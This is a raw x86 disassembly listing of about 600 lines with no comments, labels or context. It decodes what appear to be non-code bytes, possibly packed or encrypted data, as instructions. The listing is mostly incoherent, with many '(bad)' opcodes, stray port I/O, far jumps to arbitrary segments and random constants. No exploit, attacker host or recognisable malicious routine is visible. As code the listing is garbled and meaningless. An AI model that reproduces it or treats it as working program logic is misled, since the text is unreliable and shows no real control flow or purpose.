  41d9df:	ins    DWORD PTR es:[edi],dx
  41d9e0:	xor    cx,WORD PTR [ebx+0x30]
  41d9e4:	in     al,0x4f
  41d9e6:	and    eax,0x15f29248
  41d9eb:	or     al,0xd4
  41d9ed:	add    ebx,DWORD PTR [ecx+0x47]
  41d9f0:	or     al,bl
  41d9f2:	push   ebp
  41d9f3:	or     DWORD PTR [edx-0x46],ebx
  41d9f6:	into   
  41d9f7:	jnp    0x41d9d9
  41d9f9:	in     al,0xc9
  41d9fb:	xchg   ebp,eax
  41d9fc:	ror    edx,0xcf
  41d9ff:	mov    dl,0xc4
  41da01:	adc    al,0x57
  41da03:	mov    esi,0xef00e894
  41da08:	mov    eax,0xa51869c3
  41da0d:	pop    ebx
  41da0e:	sub    ah,BYTE PTR [esi-0x2e]
  41da11:	sub    cl,0x16
  41da14:	out    0x13,eax
  41da16:	inc    edi
  41da17:	push   esi
  41da18:	jmp    0x41d9e1
  41da1a:	and    ecx,DWORD PTR [ecx]
  41da1c:	and    al,0x72
  41da1e:	pushf  
  41da1f:	in     al,dx
  41da20:	es xchg esi,eax
  41da22:	lods   al,BYTE PTR ds:[esi]
  41da23:	rcr    DWORD PTR [esi],cl
  41da25:	mov    WORD PTR [edi],es
  41da27:	loop   0x41da78
  41da29:	idiv   esi
  41da2b:	popf   
  41da2c:	add    eax,0x744909e2
  41da31:	push   ds
  41da32:	lahf   
  41da33:	cmc    
  41da34:	hlt    
  41da35:	and    DWORD PTR [ecx],edi
  41da37:	in     eax,dx
  41da38:	xchg   esi,eax
  41da39:	dec    ebp
  41da3a:	sbb    eax,0xfe616121
  41da3f:	and    al,0x6f
  41da41:	(bad)  
  41da42:	mov    ecx,DWORD PTR [edx-0x8]
  41da45:	mov    ds:0x744a89aa,al
  41da4a:	jl     0x41da43
  41da4c:	mov    ch,dl
  41da4e:	repz dec ebp
  41da50:	pop    eax
  41da51:	enter  0xb46d,0x48
  41da55:	add    BYTE PTR [eax+0x48d2cafe],cl
  41da5b:	inc    edx
  41da5c:	cmp    edx,DWORD PTR [ecx+0x6cdd85d]
  41da62:	push   esi
  41da63:	inc    ebp
  41da64:	push   es
  41da65:	aad    0xef
  41da67:	mov    ds:0xf27e53dc,eax
  41da6c:	and    cl,ah
  41da6e:	jno    0x41daa7
  41da70:	out    0xc1,al
  41da72:	mov    ebx,0x8010fe5c
  41da77:	xchg   ebp,eax
  41da78:	fistp  WORD PTR [ebx]
  41da7a:	push   ecx
  41da7b:	in     eax,0x9f
  41da7d:	mov    edx,0xb2d4a5d7
  41da82:	rcr    edi,0xfd
  41da85:	cld    
  41da86:	leave  
  41da87:	or     al,0x86
  41da89:	aas    
  41da8a:	jle    0x41daea
  41da8c:	and    DWORD PTR [ecx],esi
  41da8e:	mov    es,WORD PTR [esi-0x1a]
  41da91:	arpl   sp,sp
  41da93:	cmc    
  41da94:	cld    
  41da95:	dec    ebx
  41da96:	pop    esp
  41da97:	xor    BYTE PTR [ecx],bh
  41da99:	mov    ds:0x35a4b10d,al
  41da9e:	js     0x41dadd
  41daa0:	js     0x41da57
  41daa2:	push   eax
  41daa3:	dec    edx
  41daa4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41daa5:	push   edi
  41daa6:	outs   dx,DWORD PTR ds:[esi]
  41daa7:	loopne 0x41dab3
  41daa9:	jo     0x41daaa
  41daab:	cs push edi
  41daad:	jmp    0x41da51
  41daaf:	add    BYTE PTR [edi+0x1fa27949],bh
  41dab5:	mov    ds:0x1a11344b,eax
  41daba:	xchg   ecx,eax
  41dabb:	xor    DWORD PTR ss:[edi],edi
  41dabe:	sbb    bh,BYTE PTR [ebx-0x19bd37a8]
  41dac4:	sub    ebp,DWORD PTR [edx-0xa]
  41dac7:	je     0x41da57
  41dac9:	xchg   ebp,eax
  41daca:	iret   
  41dacb:	or     al,BYTE PTR [esi-0x6ab5b581]
  41dad1:	enter  0x1b33,0x95
  41dad5:	add    eax,0xfa7fbcc3
  41dada:	jb     0x41db50
  41dadc:	mov    edi,0x4480b28
  41dae1:	addr16 cdq 
  41dae3:	push   ds
  41dae4:	sub    BYTE PTR [ebp-0x4ba6bc1a],al
  41daea:	(bad)
  41daed:	adc    cl,BYTE PTR [edx-0x2b]
  41daf0:	mov    WORD PTR [ebx-0x1ee800b9],?
  41daf6:	push   ss
  41daf7:	mov    WORD PTR [eax+0x1910dc85],ds
  41dafd:	xchg   ebx,eax
  41dafe:	in     al,dx
  41daff:	jecxz  0x41db01
  41db01:	jae    0x41db7e
  41db03:	lods   al,BYTE PTR ds:[esi]
  41db04:	xchg   ebx,eax
  41db05:	(bad)
  41db08:	(bad)  
  41db09:	sub    cl,al
  41db0b:	pop    ss
  41db0c:	mov    BYTE PTR [ecx-0x5a49bdba],al
  41db12:	push   ebp
  41db13:	cmp    ch,BYTE PTR [ebp+edx*8+0x1f]
  41db17:	push   edi
  41db18:	jp     0x41dab0
  41db1a:	jmp    0x41db0d
  41db1c:	inc    ebx
  41db1d:	mov    dl,0x32
  41db1f:	jecxz  0x41db4d
  41db21:	ds sti 
  41db23:	inc    esi
  41db24:	(bad)  
  41db25:	(bad)  
  41db26:	mov    al,bl
  41db28:	and    DWORD PTR [edi],0xb265b4bd
  41db2e:	pop    ecx
  41db2f:	mov    al,ds:0x15ddb109
  41db34:	xchg   esp,eax
  41db35:	jns    0x41db4e
  41db37:	cld    
  41db38:	popf   
  41db39:	jnp    0x41dafd
  41db3b:	xlat   BYTE PTR ds:[ebx]
  41db3c:	xchg   ebp,eax
  41db3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db3e:	cmp    DWORD PTR [ecx-0x7d],0xffffffaa
  41db42:	ret    
  41db43:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41db44:	or     ah,BYTE PTR [esi]
  41db46:	cmp    al,0xb8
  41db48:	enter  0x5f65,0x43
  41db4c:	repnz mov dl,0x2a
  41db4f:	js     0x41db5c
  41db51:	cmp    ebx,DWORD PTR [esi]
  41db53:	sti    
  41db54:	jbe    0x41db07
  41db56:	fisub  DWORD PTR [eax+0xcd9824]
  41db5c:	lods   eax,DWORD PTR ds:[esi]
  41db5d:	pop    ecx
  41db5e:	mov    ch,0xe2
  41db60:	(bad)  
  41db61:	js     0x41db83
  41db63:	jb     0x41daf1
  41db65:	mov    al,ds:0xedc08c30
  41db6a:	(bad)  
  41db6b:	jp     0x41db19
  41db6d:	inc    edi
  41db6e:	inc    ecx
  41db6f:	sbb    al,0xcc
  41db71:	mov    WORD PTR [eax+0x64],ds
  41db74:	inc    ebp
  41db75:	inc    esp
  41db76:	mov    ds:0x75b18264,al
  41db7b:	mov    ah,0xff
  41db7d:	inc    eax
  41db7e:	imul   esp,DWORD PTR [esp+ebx*4-0x144e950a],0xd0cef48a
  41db89:	mov    bh,0xe9
  41db8b:	in     eax,dx
  41db8c:	mov    bh,0xf5
  41db8e:	or     ebx,esp
  41db90:	int3   
  41db91:	mov    dh,0xad
  41db93:	add    DWORD PTR [ecx],esi
  41db95:	mov    esp,0x5df2992
  41db9a:	cmp    ch,cl
  41db9c:	inc    ebx
  41db9d:	or     eax,0xa53b57a5
  41dba2:	mov    BYTE PTR [eax+0x41],al
  41dba5:	fwait
  41dba6:	lods   eax,DWORD PTR ss:[esi]
  41dba8:	shl    edi,cl
  41dbaa:	gs pop ebp
  41dbac:	mov    DWORD PTR [eax+eax*4],0x6005d13d
  41dbb3:	shr    DWORD PTR [esi],cl
  41dbb5:	js     0x41dbc5
  41dbb7:	add    ebp,DWORD PTR [esi]
  41dbb9:	call   0x56e503db
  41dbbe:	mov    dh,0xf1
  41dbc0:	pop    ds
  41dbc1:	dec    dx
  41dbc3:	sbb    ebx,esi
  41dbc5:	xchg   esp,eax
  41dbc6:	and    bl,cl
  41dbc8:	mov    ds:0x1e8d300b,eax
  41dbcd:	cmp    al,bh
  41dbcf:	fbld   TBYTE PTR [edx-0x1b]
  41dbd2:	xchg   edi,eax
  41dbd3:	jbe    0x41db7e
  41dbd5:	add    ecx,DWORD PTR [esi-0x37]
  41dbd8:	scas   eax,DWORD PTR es:[edi]
  41dbd9:	push   ds
  41dbda:	cmp    al,0x15
  41dbdc:	inc    ecx
  41dbdd:	jno    0x41dbf4
  41dbdf:	mov    ah,0xfc
  41dbe1:	out    dx,eax
  41dbe2:	mov    WORD PTR [ecx+0x65baacd6],es
  41dbe8:	test   eax,0x6ef82580
  41dbed:	inc    ecx
  41dbee:	cmp    DWORD PTR [ecx+ebp*1],ebp
  41dbf1:	and    eax,0xd766df18
  41dbf6:	xchg   esi,eax
  41dbf7:	test   eax,0xdc29f3f8
  41dbfc:	jb     0x41db9e
  41dbfe:	adc    al,al
  41dc00:	int3   
  41dc01:	fld    QWORD PTR [edi-0x3a]
  41dc04:	add    eax,0x2e083bb1
  41dc09:	sbb    al,0x62
  41dc0b:	inc    eax
  41dc0c:	test   BYTE PTR [ebx+0x7ea2d51e],ch
  41dc12:	jb     0x41dc42
  41dc14:	dec    ebp
  41dc15:	or     eax,0xbbca885e
  41dc1a:	pushf  
  41dc1b:	shl    ecx,1
  41dc1d:	loope  0x41dc74
  41dc1f:	test   eax,0x58a1a41e
  41dc24:	ficomp DWORD PTR [esi-0x3943d023]
  41dc2a:	data16 (bad) 
  41dc2c:	adc    eax,esi
  41dc2e:	push   edi
  41dc2f:	int3   
  41dc30:	(bad)  
  41dc32:	inc    edx
  41dc33:	ror    cl,cl
  41dc35:	xchg   esi,eax
  41dc36:	cmp    bh,BYTE PTR ds:0x9d91e51a
  41dc3c:	inc    edi
  41dc3d:	pop    ebx
  41dc3e:	aas    
  41dc3f:	xchg   edi,eax
  41dc40:	mov    cs,WORD PTR [ecx+0xe3dc078]
  41dc46:	repz ud2 
  41dc49:	outs   dx,BYTE PTR ds:[esi]
  41dc4a:	mov    edx,DWORD PTR [ebx-0x68]
  41dc4d:	fild   WORD PTR [edi-0x10]
  41dc50:	fist   DWORD PTR [edx+0x2]
  41dc53:	add    al,0x27
  41dc55:	mov    ecx,0x16f1ccf2
  41dc5a:	test   eax,0xe215f71a
  41dc5f:	push   es
  41dc60:	mov    ch,0x48
  41dc62:	cmp    al,0x7d
  41dc64:	imul   ebp,DWORD PTR [edx],0xffffffe1
  41dc67:	inc    edx
  41dc68:	adc    BYTE PTR [ebp-0x460b4e89],bh
  41dc6e:	pop    ecx
  41dc6f:	dec    edx
  41dc70:	dec    bx
  41dc72:	push   0x6ea4caf5
  41dc77:	pushf  
  41dc78:	es and eax,0xc7ff8848
  41dc7e:	pop    esi
  41dc7f:	pop    eax
  41dc80:	or     al,0xd1
  41dc82:	mov    dh,0x2c
  41dc84:	mov    esp,0xc45f38a2
  41dc89:	repz fisubr DWORD PTR [edi+0x1c922003]
  41dc90:	push   0x9c5fe09f
  41dc95:	lock inc edi
  41dc97:	(bad)  
  41dc98:	mov    dh,0xf7
  41dc9a:	sub    eax,0xb66e38f0
  41dc9f:	and    DWORD PTR [edi-0x4b],0xcf68c7ea
  41dca6:	adc    esi,DWORD PTR [ecx]
  41dca8:	dec    ebx
  41dca9:	call   0xba55:0x54d04366
  41dcb0:	in     al,0xfe
  41dcb2:	jecxz  0x41dd29
  41dcb4:	lahf   
  41dcb5:	sbb    ecx,DWORD PTR [ebx]
  41dcb7:	lds    ecx,FWORD PTR [esi+edi*2]
  41dcba:	adc    ah,BYTE PTR [ecx-0xd]
  41dcbd:	sbb    DWORD PTR [edx-0x6f],esp
  41dcc0:	imul   ebx,DWORD PTR [eax+0x22db0358],0x41
  41dcc7:	cmp    edx,DWORD PTR [edx+esi*4+0x24]
  41dccb:	push   ss
  41dccc:	mov    al,0x12
  41dcce:	jb     0x41dc75
  41dcd0:	dec    esp
  41dcd1:	jmp    0xc56f:0x1a97b635
  41dcd8:	cmp    eax,0xe9163652
  41dcdd:	mov    esp,DWORD PTR [ecx+0x72]
  41dce0:	mov    bl,0xf
  41dce2:	mov    ecx,0xe95abea1
  41dce7:	icebp  
  41dce8:	cdq    
  41dce9:	dec    esp
  41dcea:	and    al,0x14
  41dcec:	loopne 0x41dc9e
  41dcee:	jle    0x41dca6
  41dcf0:	loopne 0x41dc78
  41dcf2:	pushf  
  41dcf3:	pop    edi
  41dcf4:	out    0xda,al
  41dcf6:	(bad)  
  41dcf7:	popf   
  41dcf8:	das    
  41dcf9:	aam    0x85
  41dcfb:	data16 test BYTE PTR [edi],dh
  41dcfe:	in     al,0xe7
  41dd00:	jmp    0x5585629b
  41dd05:	dec    edx
  41dd06:	lea    edx,[ecx*1+0x2474ee31]
  41dd0d:	cmp    bl,BYTE PTR [edx]
  41dd0f:	pusha  
  41dd10:	push   esi
  41dd11:	mov    cl,0xc2
  41dd13:	inc    BYTE PTR [eax]
  41dd15:	mov    ebx,0x500a7bd7
  41dd1a:	dec    eax
  41dd1b:	jecxz  0x41dccf
  41dd1d:	call   0x2ab8:0xcf9a0bc2
  41dd24:	mov    esi,0xf082f0ff
  41dd29:	and    DWORD PTR ds:0xd93ca72a,esi
  41dd2f:	loope  0x41dd1f
  41dd31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dd32:	mov    ecx,0xa354ea8e
  41dd37:	in     eax,0xe8
  41dd39:	jge    0x41dd27
  41dd3b:	jmp    0xe1c9:0xa97652c8
  41dd42:	ds xchg ebx,eax
  41dd44:	add    eax,0xcab5156d
  41dd49:	imul   edx,DWORD PTR [edx+0x48922500],0x7df0fd83
  41dd53:	clc    
  41dd54:	stc    
  41dd55:	(bad)  
  41dd57:	or     DWORD PTR [esi],esi
  41dd59:	js     0x41dd98
  41dd5b:	popf   
  41dd5c:	xlat   BYTE PTR ds:[ebx]
  41dd5d:	and    al,0x45
  41dd5f:	dec    eax
  41dd60:	jle    0x41ddcd
  41dd62:	dec    eax
  41dd63:	stos   BYTE PTR es:[edi],al
  41dd64:	(bad)  
  41dd65:	fsubr  st,st(4)
  41dd67:	fcom   QWORD PTR [eax-0x21]
  41dd6a:	popa   
  41dd6b:	mov    ds:0x7ef753eb,al
  41dd70:	dec    ebp
  41dd71:	xlat   BYTE PTR ds:[ebx]
  41dd72:	push   es
  41dd73:	sub    BYTE PTR [edx+0x6b9d9c33],0xef
  41dd7a:	mov    ds:0x118cffc8,eax
  41dd7f:	das    
  41dd80:	pop    ecx
  41dd81:	cli    
  41dd82:	rol    DWORD PTR [edx-0x4f],1
  41dd85:	dec    edx
  41dd86:	mov    cl,0x94
  41dd88:	jae    0x41dd72
  41dd8a:	sbb    ebx,DWORD PTR [edi+0x12]
  41dd8d:	inc    ebx
  41dd8e:	mov    ds:0x642bec76,al
  41dd93:	ds mov ebp,edi
  41dd96:	ror    BYTE PTR [esi-0x38c75c6b],cl
  41dd9c:	fnstenv [eax-0x305f5a9]
  41dda2:	mov    edi,0xcecc03e8
  41dda7:	push   DWORD PTR ds:0x359a8d84
  41ddad:	mov    ebp,esp
  41ddaf:	int    0x9a
  41ddb1:	inc    esi
  41ddb2:	pop    es
  41ddb3:	push   edi
  41ddb4:	shr    DWORD PTR [esi],0x3b
  41ddb7:	jge    0x41dd8d
  41ddb9:	out    dx,eax
  41ddba:	mov    ebp,0x35dcd6d0
  41ddbf:	xchg   BYTE PTR [edx],dh
  41ddc1:	pop    ss
  41ddc2:	xchg   ecx,eax
  41ddc3:	adc    eax,0x5b5bf542
  41ddc8:	stos   BYTE PTR es:[edi],al
  41ddc9:	adc    ebp,ebx
  41ddcb:	mov    ah,0x0
  41ddcd:	inc    eax
  41ddce:	push   DWORD PTR [ecx+ebp*8-0x4058e6ec]
  41ddd5:	sti    
  41ddd6:	mov    esi,0xf5223322
  41dddb:	cld    
  41dddc:	mov    dh,0xf7
  41ddde:	jmp    0xfc7d4e7c
  41dde3:	repnz mov bh,0x33
  41dde6:	enter  0x4fff,0x11
  41ddea:	mov    bh,0x27
  41ddec:	inc    edx
  41dded:	imul   eax,DWORD PTR [eax-0x18],0x62ca2c7a
  41ddf4:	cmp    eax,0xc38dea12
  41ddf9:	mov    al,0x7b
  41ddfb:	lods   eax,DWORD PTR ds:[esi]
  41ddfc:	scas   al,BYTE PTR es:[edi]
  41ddfd:	mov    ch,0x26
  41ddff:	and    eax,0xf08d4dd4
  41de04:	ins    DWORD PTR es:[edi],dx
  41de05:	lds    eax,FWORD PTR [edx+0x2e9f3c95]
  41de0b:	push   edi
  41de0c:	out    dx,al
  41de0d:	ja     0x41ddd5
  41de0f:	lahf   
  41de10:	imul   esp,DWORD PTR [esi+0x54b0f9ea],0x37
  41de17:	sbb    dl,BYTE PTR [edi+edi*4+0xb]
  41de1b:	push   es
  41de1c:	lock sub al,0x7d
  41de1f:	dec    edx
  41de20:	mov    ecx,ecx
  41de22:	daa    
  41de23:	mov    eax,0x7ff1e101
  41de28:	sbb    al,BYTE PTR [esp+edi*2]
  41de2b:	adc    al,0x68
  41de2d:	mov    ebx,DWORD PTR [eax]
  41de2f:	pop    eax
  41de30:	sub    ebp,ebx
  41de32:	push   es
  41de33:	adc    BYTE PTR [ebx],bl
  41de35:	pusha  
  41de36:	mov    dh,0x23
  41de38:	(bad)  [ecx+0x77696671]
  41de3e:	push   0xffffffef
  41de40:	and    eax,0x113f142f
  41de45:	mov    ds:0x3e0ea511,eax
  41de4a:	or     eax,0x2f2e4a2a
  41de4f:	retf   0x5057
  41de52:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41de53:	add    ah,BYTE PTR [ebp+0x43f208be]
  41de59:	leave  
  41de5a:	jo     0x41de2f
  41de5c:	data16 fcmovnb st,st(3)
  41de5f:	sbb    al,0x27
  41de61:	outs   dx,BYTE PTR ds:[esi]
  41de62:	dec    ebp
  41de63:	in     al,0x69
  41de65:	cdq    
  41de66:	xchg   DWORD PTR ds:0xf5bf8aaf,eax
  41de6c:	lock xchg ebp,eax
  41de6e:	cs xchg sp,ax
  41de71:	mov    ebx,0x4ba29f8c
  41de76:	lock pop edi
  41de78:	loopne 0x41de88
  41de7a:	clc    
  41de7b:	test   al,0xb2
  41de7d:	scas   al,BYTE PTR es:[edi]
  41de7e:	or     DWORD PTR [edi+0x738956d5],ebp
  41de84:	mov    ah,0x46
  41de86:	pushf  
  41de87:	ins    DWORD PTR es:[edi],dx
  41de88:	mov    dh,0x83
  41de8a:	jo     0x41def3
  41de8c:	xchg   ebp,eax
  41de8d:	sti    
  41de8e:	js     0x41de49
  41de90:	xor    cl,BYTE PTR [eax+0x71]
  41de93:	mov    ss,WORD PTR [edi-0x6b]
  41de96:	xchg   BYTE PTR [edx],ah
  41de98:	dec    ecx
  41de99:	xor    al,0xd3
  41de9b:	arpl   WORD PTR [ecx],dx
  41de9d:	mov    edi,0xf118583f
  41dea2:	cmp    DWORD PTR [eax],0xfdad9ae8
  41dea8:	ret    
  41dea9:	ret    
  41deaa:	jne    0x41dee9
  41deac:	clc    
  41dead:	imul   esp,DWORD PTR [edx+0x5795a7fc],0x2c
  41deb4:	lock (bad) 
  41deb6:	xor    dl,dh
  41deb8:	aam    0x0
  41deba:	sti    
  41debb:	test   DWORD PTR [esi+0x697305b4],ebp
  41dec1:	xor    cl,BYTE PTR [eax-0x1212bd9b]
  41dec7:	pop    eax
  41dec8:	jecxz  0x41defe
  41deca:	shr    BYTE PTR [edi-0x6ec36239],1
  41ded0:	lods   al,BYTE PTR ds:[esi]
  41ded1:	jmp    0x3730896
  41ded6:	add    al,0xdd
  41ded8:	and    ebx,DWORD PTR [eax+0x25]
  41dedb:	xor    eax,0x7e095303
  41dee0:	sbb    BYTE PTR [ebx],bh
  41dee2:	bound  edx,QWORD PTR [ebx]
  41dee4:	js     0x41df3c
  41dee6:	lods   al,BYTE PTR ds:[esi]
  41dee7:	and    ecx,DWORD PTR [edx-0x2a]
  41deea:	and    bh,dl
  41deec:	rcl    DWORD PTR [edi-0x1c],1
  41deef:	xchg   ecx,eax
  41def0:	inc    edx
  41def1:	paddusb mm3,mm0
  41def4:	in     eax,0xca
  41def6:	sub    al,0xe4
  41def8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41def9:	sub    BYTE PTR [ecx],bl
  41defb:	dec    ebx
  41defc:	push   esi
  41defd:	mov    al,ds:0x4f239ade
  41df02:	bound  ebp,QWORD PTR [ebp-0x404a686b]
  41df08:	scas   eax,DWORD PTR es:[edi]
  41df09:	xor    eax,0x49423610
  41df0e:	ror    BYTE PTR [ecx],1
  41df10:	inc    edx
  41df11:	hlt    
  41df12:	inc    ebp
  41df13:	jb     0x41def6
  41df15:	cmp    eax,edx
  41df17:	scas   eax,DWORD PTR es:[edi]
  41df18:	pop    esp
  41df19:	mov    al,0x3a
  41df1b:	xchg   esp,eax
  41df1c:	rep ins DWORD PTR es:[edi],dx
  41df1e:	mov    dl,0x51
  41df20:	inc    ebp
  41df21:	mov    ecx,0x931b1e04
  41df26:	and    bl,BYTE PTR [ecx+0x38]
  41df29:	stc    
  41df2a:	fmul   DWORD PTR [esp+ebp*8]
  41df2d:	rcr    DWORD PTR [esp+edx*8+0x53],cl
  41df31:	dec    eax
  41df32:	jp     0x41df4c
  41df34:	pop    ecx
  41df35:	jmp    0x41dfaa
  41df37:	dec    ebx
  41df38:	daa    
  41df39:	cmp    al,0x1c
  41df3b:	xchg   ebp,eax
  41df3c:	add    bl,BYTE PTR [ebx]
  41df3e:	cmp    al,bl
  41df40:	mov    ah,0xf
  41df42:	cmp    al,0xf0
  41df44:	mov    ah,0xb2
  41df46:	add    ebx,0x49
  41df49:	cmc    
  41df4a:	loopne 0x41ded5
  41df4c:	mov    bh,BYTE PTR [edx]
  41df4e:	jecxz  0x41df02
  41df50:	rcr    BYTE PTR [ebp+0x4b037576],0xa5
  41df57:	les    eax,FWORD PTR [esi+0x7f]
  41df5a:	and    eax,0x912e3c53
  41df5f:	pop    ss
  41df60:	push   esp
  41df61:	iret   
  41df62:	mov    esp,0xe99aa985
  41df67:	or     BYTE PTR [esi+esi*2-0x6522b000],dl
  41df6e:	pop    eax
  41df6f:	arpl   WORD PTR [ecx+0x10],dx
  41df72:	test   eax,0xd4b072eb
  41df77:	(bad)  
  41df78:	js     0x41dfa1
  41df7a:	call   0x8971:0x3346a2fe
  41df81:	(bad)  
  41df83:	inc    eax
  41df84:	pop    edx
  41df85:	(bad)  
  41df86:	cmp    ah,BYTE PTR [edi]
  41df88:	scas   al,BYTE PTR es:[edi]
  41df89:	dec    ebp
  41df8a:	das    
  41df8b:	mov    ah,0xa2
  41df8d:	sahf   
  41df8e:	and    DWORD PTR [ecx],ebx
  41df90:	shl    BYTE PTR [ebx+0x716b32d3],cl
  41df96:	ficom  DWORD PTR ds:0xd640b74b
  41df9c:	pop    ss
  41df9d:	popf   
  41df9e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41df9f:	shl    DWORD PTR [ecx],0xe1
  41dfa2:	lds    ebx,FWORD PTR [edx]
  41dfa4:	into   
  41dfa5:	xor    BYTE PTR [esi+0x33673ac2],ch
  41dfab:	es icebp 
  41dfad:	jp     0x41dffe
  41dfaf:	push   0x5557efbf
  41dfb4:	add    eax,0x9a320e3b
  41dfb9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dfba:	and    eax,0x7196664f
  41dfbf:	and    bl,BYTE PTR [edi-0x6b]
  41dfc2:	jg     0x41df52
  41dfc4:	inc    ebx
  41dfc5:	icebp  
  41dfc6:	mul    BYTE PTR [edi-0x4f27fcf]
  41dfcc:	popa   
  41dfcd:	ins    DWORD PTR es:[edi],dx
  41dfce:	test   edi,edx
  41dfd0:	je     0x41dff5
  41dfd2:	std    
  41dfd3:	cdq    
  41dfd4:	arpl   dx,sp
  41dfd6:	and    eax,0xa2e5a447
  41dfdb:	dec    ebx
  41dfdc:	cmp    BYTE PTR [eax+0x4be6d366],dh
  41dfe2:	(bad)  
  41dfe3:	xor    BYTE PTR [edx-0x12],dl
  41dfe6:	test   DWORD PTR [edi],eax
  41dfe8:	jp     0x41dfd3
  41dfea:	out    0x15,al
  41dfec:	fcom   DWORD PTR [ebp-0x20]
  41dfef:	add    ebp,DWORD PTR [edi+0x3e]
  41dff2:	sbb    eax,0x1bfccca2
  41dff7:	(bad)  
  41dff8:	mov    ds:0x7bd8994b,al
  41dffd:	in     al,dx
  41dffe:	fcom   QWORD PTR [ebx+0x1]
  41e001:	icebp  
  41e002:	jno    0x41e019
  41e004:	add    DWORD PTR [ecx],ebx
  41e006:	and    BYTE PTR [edx+edi*2-0x23],dl
  41e00a:	mov    DWORD PTR [esi+0x3e],esp
  41e00d:	push   esp
  41e00e:	xor    DWORD PTR [ecx+eiz*2+0x1c],ebx
  41e012:	popw   ds
  41e014:	imul   edx,esi,0x865bcac0
  41e01a:	retf   0x36c1
  41e01d:	rcl    DWORD PTR [edi+0x6],0x73
  41e021:	mov    ecx,0xd2bfaa4e
  41e026:	xor    eax,0x7fd48e5
  41e02b:	icebp  
  41e02c:	stos   BYTE PTR es:[edi],al
  41e02d:	in     al,0xf4
  41e02f:	and    DWORD PTR [edi+0x21e5f0b7],ecx
  41e035:	cmp    ebp,edx
  41e037:	imul   esp,ecx,0x7019a19a
  41e03d:	sahf   
  41e03e:	xchg   BYTE PTR [ebx+0x13],dl
  41e041:	dec    edx
  41e042:	aaa    
  41e043:	arpl   sp,sp
  41e045:	xchg   BYTE PTR [esi-0x25eed6d3],dl
  41e04b:	and    eax,0xd13fc0c0
  41e050:	(bad)  
  41e051:	push   ecx
  41e052:	fcmovb st,st(3)
  41e054:	out    0xbb,eax
  41e056:	pop    ecx
  41e057:	iret   
  41e058:	push   0xffffffe1
  41e05a:	das    
  41e05b:	add    al,0x1c
  41e05d:	(bad)  
  41e05e:	(bad)  
  41e05f:	sub    eax,0xc13f503
  41e064:	ins    DWORD PTR es:[edi],dx
  41e065:	inc    esi
  41e066:	(bad)  
  41e068:	retf   0x3ba6
  41e06b:	(bad)  
  41e06c:	pop    edi
  41e06d:	and    al,0x4e
  41e06f:	mov    esi,0xc39eecce
  41e074:	pop    ss
  41e075:	arpl   WORD PTR [ecx+0x2f],bx
  41e078:	xchg   ebx,eax
  41e079:	mul    DWORD PTR [ebx-0x44a0673]
  41e07f:	sbb    DWORD PTR [esi],eax
  41e081:	sar    BYTE PTR ds:0xb69fa616,0x31
  41e088:	and    DWORD PTR [edx+ebp*1+0x37e67b1f],eax
  41e08f:	jmp    0x8b8c:0x529139fb
  41e096:	and    eax,0x1febd272
  41e09b:	in     eax,0x1c
  41e09d:	jne    0x41e03f
  41e09f:	clc    
  41e0a0:	push   ebx
  41e0a1:	mov    esi,0x9ba65c59
  41e0a6:	out    0x4b,al
  41e0a8:	cld    
  41e0a9:	test   eax,0x2a6839a
  41e0ae:	rcl    DWORD PTR [eax+0x63],0x8c
  41e0b2:	jle    0x41e05b
  41e0b4:	inc    ecx
  41e0b5:	call   0x78b1:0xbaad8a84
  41e0bc:	ds mov ch,dl
  41e0bf:	gs in  eax,dx
  41e0c1:	lock mov ecx,0x6efd10d7
  41e0c7:	jmp    0xcc579b99
  41e0cc:	adc    dh,BYTE PTR [ebp+0x402a3a94]
  41e0d2:	(bad)  
  41e0d4:	inc    ebp
  41e0d5:	lock or cl,BYTE PTR [edx+0x3c]
  41e0d9:	mov    dh,0xb6
  41e0db:	call   0xee77:0x9017135b
  41e0e2:	ins    BYTE PTR es:[edi],dx
  41e0e3:	xchg   ecx,eax
  41e0e4:	or     BYTE PTR [ecx+0x7f],cl
  41e0e7:	xor    eax,DWORD PTR [edx]
  41e0e9:	mov    BYTE PTR [ecx],bl
  41e0eb:	jge    0x41e125
  41e0ed:	sahf   
  41e0ee:	or     edi,DWORD PTR [ecx+0x259476e2]
  41e0f4:	scas   al,BYTE PTR es:[edi]
  41e0f5:	popa   
  41e0f6:	dec    ecx
  41e0f7:	(bad)  
  41e0f8:	mov    bh,0x4b
  41e0fa:	or     ch,al
  41e0fc:	(bad)  
  41e0fd:	in     al,dx
  41e0fe:	jle    0x41e167
  41e100:	adc    DWORD PTR [ebx],eax
  41e102:	cmp    BYTE PTR [edi+esi*8],cl
  41e105:	sub    al,0x9
  41e107:	cmp    DWORD PTR [ebx+0x1],eax
  41e10a:	mov    eax,0x5160e586
  41e10f:	push   es
  41e110:	and    dh,BYTE PTR [ecx]
  41e112:	js     0x41e115
  41e114:	popa   
  41e115:	mov    ds,edx
  41e117:	xchg   BYTE PTR [ebx+0x2c],bh
  41e11a:	xlat   BYTE PTR ds:[ebx]
  41e11b:	jecxz  0x41e0a1
  41e11d:	or     DWORD PTR [edx],esi
  41e11f:	sub    eax,0x49ef12b0
  41e124:	jle    0x41e16e
  41e126:	int    0x59
  41e128:	loopne 0x41e0c3
  41e12a:	jecxz  0x41e11f
  41e12c:	push   ss
  41e12d:	aam    0xca
  41e12f:	jecxz  0x41e17c
  41e131:	nop
  41e132:	aad    0x1d
  41e134:	pop    ds
  41e135:	sahf   
  41e136:	mov    ch,0xd7
  41e138:	jl     0x41e0e5
  41e13a:	xchg   esi,ebp
  41e13c:	std    
  41e13d:	jns    0x41e0fb
  41e13f:	test   edx,0x3b8c2658
  41e145:	clc    
  41e146:	dec    esi
  41e147:	iret   
  41e148:	xchg   DWORD PTR [ebx],edi
  41e14a:	mov    edx,0x74f3885e
  41e14f:	fidivr WORD PTR [ecx+0x6379fedd]
  41e155:	retf   
  41e156:	repz push edx
  41e158:	out    dx,al
  41e159:	pop    edi
  41e15a:	mov    al,ds:0xb6833a58
  41e15f:	or     eax,0x94fdc023
  41e164:	sub    BYTE PTR [esi-0xb],0x39
  41e168:	out    0xdb,al
  41e16a:	popf   
  41e16b:	cmc    
  41e16c:	enter  0xb00a,0xe2
